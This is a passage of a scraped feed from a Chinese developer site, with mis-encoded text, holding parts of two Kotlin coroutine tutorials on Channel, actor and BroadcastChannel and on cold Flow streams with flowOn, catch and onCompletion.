åŒæ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>actor</code>æ¥å¯åŠ¨æ¶ˆè´¹è€…åç¨‹ï¼Œå¹¶è¿”å›ä¸€ä¸ª<code>SendChannel</code>,å…¶ä»–åç¨‹å°±å¯ä»¥é€šè¿‡è¿™ä¸ª channel æ¥å‘é€æ•°æ®äº†ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> receiveChannel : ReceiveChannel&lt;<span class="hljs-built_in">Int</span>&gt; = GlobalScope.produce{
    repeat(<span class="hljs-number">100</span>){

        delay(<span class="hljs-number">100</span>)
        send(it)
    }
}

<span class="hljs-keyword">val</span> sendChannel : SendChannel&lt;<span class="hljs-built_in">Int</span>&gt; = GlobalScope.actor {
    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>){
        <span class="hljs-keyword">val</span> element = receive()
        println(element)
    }
}

</code></pre>
<h2 data-id="heading-4">Channel çš„å…³é—­</h2>
<p>ä»¥ä¸Šé¢çš„<code>produce</code>æ–¹æ³•ä¸ºä¾‹,æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ€ç»ˆè¿”å›çš„æ˜¯ä¸€ä¸ª<code>ProducerCoroutine</code>,å®ƒçš„å®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProducerCoroutine</span>&lt;<span class="hljs-type">E</span>&gt;(
    parentContext: CoroutineContext, channel: Channel&lt;E&gt;
) : ChannelCoroutine&lt;E&gt;(parentContext, channel, <span class="hljs-literal">true</span>, active = <span class="hljs-literal">true</span>), ProducerScope&lt;E&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> isActive: <span class="hljs-built_in">Boolean</span>
        <span class="hljs-keyword">get</span>() = <span class="hljs-keyword">super</span>.isActive

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCompleted</span><span class="hljs-params">(value: <span class="hljs-type">Unit</span>)</span></span> {
        _channel.close()
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCancelled</span><span class="hljs-params">(cause: <span class="hljs-type">Throwable</span>, handled: <span class="hljs-type">Boolean</span>)</span></span> {
        <span class="hljs-keyword">val</span> processed = _channel.close(cause)
        <span class="hljs-keyword">if</span> (!processed &amp;&amp; !handled) handleCoroutineException(context, cause)
    }
}

</code></pre>
<p>æˆ‘ä»¬å‘ç°åœ¨å®ƒçš„<code>å®Œæˆ</code>å’Œ<code>å–æ¶ˆ</code>æ–¹æ³•ä¸­éƒ½ä¼šè°ƒç”¨<code>_channel.close</code>çš„æ–¹æ³•ã€‚ä¹Ÿæ­£æ˜¯è¿™æ ·ï¼ŒChannel æ‰è¢«ç§°ä¸ºçƒ­æ•°æ®æµã€‚è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼šå¯¹åƒä¸€ä¸ª<code>Channe</code>å¦‚æœæˆ‘ä»¬è°ƒç”¨äº†å®ƒçš„<code>close</code>æ–¹æ³•ï¼Œå®ƒä¼š<strong>ç«‹å³åœæ­¢æ¥æ”¶</strong>æ–°å…ƒç´ ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ—¶å€™å®ƒçš„<code>isClosedForSend</code>ä¼šç«‹å³è¿”å›<code>true</code>,è€Œç”±<code>Channelç¼“å†²åŒº</code>çš„å­˜åœ¨ï¼Œ è¿™æ—¶å€™å¯èƒ½è¿˜æœ‰ä¸€äº›å…ƒç´ æ²¡æœ‰è¢«å¤„ç†å®Œï¼Œå› æ­¤è¦ç­‰æ‰€æœ‰çš„å…ƒç´ éƒ½è¢«è¯»å–ä¹‹å<code>isClosedForReceive</code>æ‰ä¼šè¿”å›<code>true</code>.</p>
<h2 data-id="heading-5">BroadcastChannel</h2>
<p>åœ¨å®é™…ç¯å¢ƒä¸­ï¼Œç»å¸¸ä¼šå‡ºç°ä¸€ä¸ªå‘é€å¯¹åº”å¤šä¸ªæ¥æ”¶çš„æƒ…å†µã€‚è¿™é‡Œæˆ‘ä»¬å°±éœ€è¦ BroadcastChannel äº†ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">    <span class="hljs-keyword">val</span> broadcastChannel =  BroadcastChannel&lt;<span class="hljs-built_in">Int</span>&gt;(Channel.BUFFERED)

    <span class="hljs-keyword">val</span> producer = GlobalScope.launch {
        List(<span class="hljs-number">3</span>){
            delay(<span class="hljs-number">1000</span>)
            broadcastChannel.send(it)
        }
    }
    List(<span class="hljs-number">3</span>){
        index -&gt;
        GlobalScope.launch {
            <span class="hljs-keyword">val</span> receiveChannel = broadcastChannel.openSubscription()
            <span class="hljs-keyword">for</span>(i <span class="hljs-keyword">in</span> receiveChannel){
                println(<span class="hljs-string">"[#<span class="hljs-variable">$index</span>] received <span class="hljs-variable">$i</span>"</span>)
            }
        }
    }.joinAll()
</code></pre>
<p>è¿™é‡Œæœ‰ä¸ªç»†èŠ‚éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œå¦‚æœæŠŠå‘é€ç«¯çš„<code>dealy(100)</code>å»æ‰ï¼Œå¯èƒ½ä¼šå‡ºç°éƒ¨åˆ†å…ƒç´ æ”¶ä¸åˆ°æˆ–è€…å®Œå…¨æ”¶ä¸åˆ°çš„æƒ…å†µï¼Œè¿™æ˜¯å› ä¸º<code>BroadcastChannel</code>åœ¨å‘é€çš„æ—¶å€™æ²¡æœ‰è®¢é˜…è€…ï¼Œè¿™æ¡æ¶ˆæ¯å°±è¢«ä¸¢å¼ƒäº†ã€‚<br/>
æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ™®é€šçš„ Channel è¿›è¡Œè½¬æ¢ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> channel = Channel&lt;<span class="hljs-built_in">Int</span>&gt;()
channel.broadcast(<span class="hljs-number">3</span>)
</code></pre>
<p>è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œ<strong>BroadcastChannel</strong>è¢«æ ‡è®°ä¸ºè¿‡æ—¶äº†ï¼Œå¯ä»¥ä½¿ç”¨<code>SharedFlow</code>å’Œ<code>StateFlow</code>ä»£æ›¿ã€‚<code>channel.broadcast()</code>æ–¹æ³•ä¹Ÿè¢«æ ‡è®°ä¸ºè¿‡æ—¶ï¼Œä¹Ÿæ˜¯ä½¿ç”¨<code>SharedFlow</code>æ¥ä»£æ›¿</p>
<hr/>
<p>ä»¥ä¸Š</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kotlinåç¨‹-å†·æ•°æ®æµFlow]]></title>    <link>https://juejin.cn/post/7590128405350612992</link>    <guid>https://juejin.cn/post/7590128405350612992</guid>    <pubDate>2026-01-02T10:57:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590128405350612992" data-draft-id="7590071125398487080" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kotlinåç¨‹-å†·æ•°æ®æµFlow"/> <meta itemprop="keywords" content="Kotlin"/> <meta itemprop="datePublished" content="2026-01-02T10:57:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Huangå…„"/> <meta itemprop="url" content="https://juejin.cn/user/52404619842712"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kotlinåç¨‹-å†·æ•°æ®æµFlow
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/52404619842712/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Huangå…„
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T10:57:20.000Z" title="Fri Jan 02 2026 10:57:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>ç§ä¸€é¢—æ ‘çš„æœ€å¥½æ—¶æœºæ˜¯åå¹´å‰ï¼Œå…¶æ¬¡æ˜¯ç°åœ¨ã€‚
å­¦ä¹ ä¹Ÿä¸€æ ·ã€‚
è·Ÿç€éœè€å¸ˆçš„ã€Šæ·±å…¥ç†è§£ Kotlin æºç¨‹ã€‹å­¦ä¹ ä¸€ä¸‹åç¨‹ã€‚</p>
<h2 data-id="heading-0">ä¸€ç‚¹å‰è¨€</h2>
<p>éšç€RxJavaçš„æµè¡Œï¼Œå“åº”å¼ç¼–ç¨‹æ¨¡å‹é€æ­¥æ·±å…¥äººå¿ƒã€‚Flowå°±æ˜¯kotlinåç¨‹ä¸å“åº”å¼ç¼–ç¨‹æ¨¡å‹ç»“åˆçš„äº§ç‰©ã€‚</p>
<h2 data-id="heading-1">è®¤è¯†Flow</h2>
<p>æˆ‘ä»¬ä»åºåˆ—ç”Ÿæˆå™¨å¼€å§‹</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> ints = sequence {
    (<span class="hljs-number">10.</span><span class="hljs-number">.30</span>).forEach {
        yield(it)
    }
}
</code></pre>
<p>è¿™é‡Œå¦‚æœå¸Œæœ›åœ¨å…ƒç´ ä¹‹é—´åŠ ä¸ªå»¶æ—¶æ€ä¹ˆåŠï¼Ÿå› ä¸ºå—<code>restrictsSuspension</code>æ³¨è§£çš„çº¦æŸï¼Œdelayå‡½æ•°ä¸èƒ½å†SequenceScopeçš„æ‰©å±•æˆå‘˜ä¸­è¢«è°ƒç”¨</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/838fcf6f8af0444cb6ce03ef11800d99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSHVhbmflhYQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767956240&amp;x-signature=0DTTipAvGAV7ez1lN732YsOEiBM%3D" alt="delay_in_sequence.png" loading="lazy"/></p>
<p>å‡è®¾åºåˆ—ç”Ÿæˆå™¨ä¸å—è¿™ä¸ªé™åˆ¶ï¼Œè°ƒç”¨delayå‡½æ•°ä¼šå¯¼è‡´åç»­çš„æ‰§è¡Œæµç¨‹çš„çº¿ç¨‹å‘ç”Ÿå˜åŒ–ï¼Œå¤–éƒ¨çš„è°ƒç”¨è€…å‘ç°åœ¨è®¿é—®intsçš„ä¸‹ä¸€ä¸ªå…ƒç´ çš„æ—¶å€™å±…ç„¶è¿˜ä¼šæœ‰åˆ‡æ¢çº¿ç¨‹çš„å‰¯ä½œç”¨ã€‚ä¸ä»…å¦‚æ­¤ï¼Œé€šè¿‡åˆ¶å®šè°ƒåº¦å™¨æ¥é™å®šåºåˆ—åˆ›å»ºæ‰€åœ¨çš„çº¿ç¨‹åŒæ ·æ˜¯ä¸å¯ä»¥çš„ï¼Œæˆ‘ä»¬ç”šè‡³æ²¡æœ‰åŠæ³•ä¸ºå®ƒè®¾ç½®åç¨‹ä¸Šä¸‹æ–‡ã€‚<br/>
é‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹Flowã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> intFlow = flow {
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).forEach {
        emit(it)
        delay(<span class="hljs-number">1000</span>)
    }
}
</code></pre>
<p>Flowä¹Ÿå¯ä»¥è®¾å®šå®ƒè¿è¡Œæ—¶æ‰€ä½¿ç”¨çš„è°ƒåº¦å™¨ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">intFlow.flowOn(Dispatchers.IO).collect { println(it) }
</code></pre>
<p>æœ€ç»ˆæ¶ˆè´¹intFlowéœ€è¦è°ƒç”¨collectå‡½æ•°ã€‚</p>
<h3 data-id="heading-2">å†·æ•°æ®æµ</h3>
<p>åœ¨Flowåˆ›å»ºå‡ºæ¥ä¹‹åï¼Œä¸æ¶ˆè´¹åˆ™ä¸ç”Ÿäº§ï¼Œå¤šæ¬¡æ¶ˆè´¹åˆ™å¤šæ¬¡ç”Ÿäº§ï¼Œç”Ÿäº§å’Œæ¶ˆè´¹æ€»æ˜¯ç›¸å¯¹åº”çš„ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> intFlow = flow {
        (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).forEach {
            emit(it)
            delay(<span class="hljs-number">1000</span>)
        }
    }
    intFlow.flowOn(Dispatchers.IO).collect { println(it) }
    intFlow.flowOn(Dispatchers.IO).collect { println(it) }
}
</code></pre>
<p>è¿™é‡Œä¼šè¾“å‡ºä¸¤æ¬¡â€œ123â€</p>
<h3 data-id="heading-3">å¼‚å¸¸å¤„ç†</h3>
<p>Flowçš„å¼‚å¸¸å¤„ç†ä¹Ÿæ¯”è¾ƒç›´æ¥ï¼Œç›´æ¥è°ƒç”¨<code>catch</code>å‡½æ•°å³å¯ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>catch</code>å‡½æ•°åªèƒ½æ•è·å®ƒä¸Šæ¸¸çš„å¼‚å¸¸ï¼Œå¹¶ä¸”ï¼Œå½“æˆ‘ä»¬æ²¡æœ‰è°ƒç”¨<code>catch</code>å‡½æ•°æ—¶ï¼Œæœªæ•è·çš„å¼‚å¸¸ä¼šåœ¨æ¶ˆè´¹æ—¶æŠ›å‡ºã€‚å½“ç„¶äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>onCompletion</code>æ¥è¿›è¡ŒFLowå®Œæˆæ—¶çš„é€»è¾‘</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flow {
        emit(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">throw</span> ArithmeticException(<span class="hljs-string">"div 0"</span>)
    }.<span class="hljs-keyword">catch</span> { t: Throwable -&gt;
        println(<span class="hljs-string">"caught error :<span class="hljs-variable">$t</span>"</span>)
    }.onCompletion { t: Throwable? -&gt; 
        println(<span class="hljs-string">"finally."</span>)
    }.flowOn(Dispatchers.Default)
        .collect { value -&gt; println(value) }
}
</code></pre>
